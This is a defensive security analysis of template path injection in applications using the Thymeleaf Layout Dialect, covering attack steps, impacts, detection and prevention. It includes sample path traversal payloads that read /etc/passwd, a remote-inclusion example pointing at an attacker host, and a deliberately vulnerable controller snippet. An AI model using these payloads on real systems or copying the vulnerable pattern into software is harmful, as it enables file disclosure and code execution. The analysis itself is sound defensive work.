## Deep Analysis of Attack Tree Path: Inject Malicious Template Path

**Attack Tree Path:**

```
Inject malicious template path

        * Inject malicious template path **(Critical Node)**
```

**Context:** This analysis focuses on the "Inject malicious template path" attack vector within an application utilizing the `thymeleaf-layout-dialect` library for its templating engine. This library allows for the creation of reusable layouts and fragments, enhancing code organization and maintainability. However, if not handled carefully, the mechanisms for specifying template paths can be exploited.

**Severity:** **Critical**

**Technical Description:**

The core vulnerability lies in the application's failure to properly sanitize or validate user-controlled input that influences the resolution of template paths within the Thymeleaf Layout Dialect. Attackers can leverage this weakness to inject arbitrary file paths, potentially leading to severe consequences.

**How Thymeleaf Layout Dialect Handles Template Paths:**

The `thymeleaf-layout-dialect` uses attributes like `layout:decorate`, `layout:fragment`, and `th:insert`/`th:replace` to include or replace parts of templates. These attributes often accept string values representing the paths to the layout or fragment templates.

**The Attack:**

An attacker can manipulate input fields, URL parameters, HTTP headers, or any other data source that the application uses to determine the template path. By injecting malicious paths, they can force the application to load and render templates from unexpected locations.

**Detailed Breakdown of the Attack:**

1. **Identifying Injection Points:** The attacker first needs to identify where the application takes user input that is used to construct or influence template paths. This could be:
    * **URL Parameters:**  Parameters in the URL that directly specify the layout or fragment to use.
    * **Request Body:** Data sent in POST requests, potentially containing the desired layout or fragment name.
    * **HTTP Headers:**  Less common but potentially exploitable if the application uses custom headers for template selection.
    * **Database or Configuration:** If the application dynamically fetches template paths from a database or configuration file that can be influenced by the attacker (e.g., through SQL injection or configuration vulnerabilities).

2. **Crafting Malicious Payloads:** Once an injection point is found, the attacker crafts a malicious template path. Common techniques include:
    * **Path Traversal:** Using sequences like `../` to navigate outside the intended template directory. This allows access to sensitive files or even arbitrary code execution if the attacker can place a malicious template in an accessible location.
        * **Example:** `layout:decorate="file:///etc/passwd"` (Attempting to read the password file)
        * **Example:** `layout:decorate="../templates/malicious.html"` (Assuming `malicious.html` is placed in a parent directory)
    * **Absolute Paths:** Providing a full path to a file on the server. This requires knowledge of the server's file system structure.
        * **Example:** `layout:decorate="/opt/app/sensitive_data.html"`
    * **Remote File Inclusion (RFI) (Less likely with default Thymeleaf configuration but worth considering):** If Thymeleaf is configured to allow external template resolution, an attacker might attempt to include templates from remote servers. This is typically disabled by default for security reasons.
        * **Example (hypothetical):** `layout:decorate="http://attacker.com/malicious.html"`

3. **Executing the Attack:** The attacker sends a request containing the malicious payload to the vulnerable application.

4. **Exploitation:** The application, without proper validation, uses the attacker-controlled path to locate and render a template.

**Potential Impacts:**

* **Arbitrary File Reading:** The attacker can read sensitive files on the server's file system, including configuration files, source code, and internal data.
* **Arbitrary Code Execution (ACE):** If the attacker can upload or place a malicious template file onto the server and then inject its path, they can execute arbitrary code when the template is processed. This is the most critical impact.
* **Denial of Service (DoS):**  Injecting paths to extremely large files or files that cause the application to hang can lead to a denial of service.
* **Information Disclosure:**  By rendering attacker-controlled templates, they can inject arbitrary HTML and JavaScript into the application's responses, potentially leading to Cross-Site Scripting (XSS) attacks or exposing internal application details.
* **Application Logic Bypass:**  Attackers might be able to bypass intended application workflows by forcing the rendering of specific templates that expose hidden functionalities or data.

**Preconditions for Successful Exploitation:**

* **User-controlled input influencing template paths:** The application must allow user input to directly or indirectly determine the template path used by the `thymeleaf-layout-dialect`.
* **Lack of input sanitization and validation:** The application must fail to properly sanitize or validate the input used for template paths. This includes checking for path traversal sequences, absolute paths, and potentially remote URLs (if enabled).
* **File system access permissions:** The application's user context must have sufficient permissions to access the injected file path.

**Detection and Prevention Strategies:**

**Detection:**

* **Code Review:** Carefully review the codebase to identify all locations where user input is used to construct or influence template paths within Thymeleaf Layout Dialect attributes.
* **Static Analysis Security Testing (SAST):** Utilize SAST tools that can identify potential path traversal vulnerabilities in the code.
* **Dynamic Application Security Testing (DAST):** Employ DAST tools or manual penetration testing to attempt injecting various malicious template paths and observe the application's behavior.
* **Security Auditing:** Regularly audit the application's configuration and dependencies for potential vulnerabilities.
* **Runtime Monitoring:** Monitor application logs for unusual file access patterns or error messages related to template loading.

**Prevention:**

* **Input Sanitization and Validation:**
    * **Whitelist Allowed Characters:**  Restrict the characters allowed in template path inputs to a predefined set of safe characters.
    * **Path Canonicalization:**  Convert the input path to its canonical form to resolve symbolic links and remove redundant separators, making path traversal attempts more difficult.
    * **Blacklist Dangerous Patterns:**  Filter out known path traversal sequences like `../` and absolute paths.
* **Secure Template Resolution:**
    * **Restrict Template Directories:** Configure Thymeleaf to only load templates from a specific, well-defined directory. Avoid allowing dynamic paths outside of this secure directory.
    * **Avoid User-Controlled Template Names Directly:**  Instead of directly using user input as the template name, map user input to predefined, safe template names or identifiers.
    * **Content Security Policy (CSP):** While not directly preventing template injection, CSP can help mitigate the impact of injected scripts if an attacker manages to render a malicious template.
* **Principle of Least Privilege:** Ensure the application runs with the minimum necessary file system permissions to reduce the potential impact of a successful attack.
* **Regular Updates:** Keep Thymeleaf, `thymeleaf-layout-dialect`, and other dependencies up-to-date to patch known vulnerabilities.
* **Security Headers:** Implement security headers like `X-Content-Type-Options: nosniff` and `X-Frame-Options: DENY/SAMEORIGIN` to further harden the application.
* **Web Application Firewall (WAF):** Deploy a WAF to detect and block malicious requests attempting to inject template paths.

**Specific Considerations for Thymeleaf Layout Dialect:**

* **Focus on `layout:decorate`, `layout:fragment`, and `th:insert`/`th:replace` Attributes:** Pay close attention to how the values for these attributes are determined and whether user input plays a role.
* **Layout Inheritance:** Be mindful of how layout inheritance is implemented and whether an attacker can manipulate the base layout path.
* **Fragment Selection:** If the application allows users to specify fragments within a layout, ensure that the fragment names are also properly validated.

**Example Vulnerable Code Snippet (Illustrative):**

```java
@Controller
public class TemplateController {

    @GetMapping("/render/{layoutName}")
    public String renderWithLayout(@PathVariable String layoutName, Model model) {
        model.addAttribute("content", "This is the content.");
        return layoutName; // Directly using user input as the template name
    }
}
```

In this example, the `layoutName` from the URL is directly used as the template name, making it vulnerable to path traversal attacks. An attacker could access `/render/../etc/passwd` (if the view resolver allows it) or other malicious templates.

**Conclusion:**

The "Inject malicious template path" attack is a critical vulnerability in applications using `thymeleaf-layout-dialect`. It allows attackers to bypass intended application logic, potentially leading to severe consequences like arbitrary file reading and code execution. A robust defense strategy involves meticulous input sanitization and validation, secure template resolution mechanisms, and adherence to security best practices. Development teams must prioritize addressing this vulnerability to ensure the security and integrity of their applications.
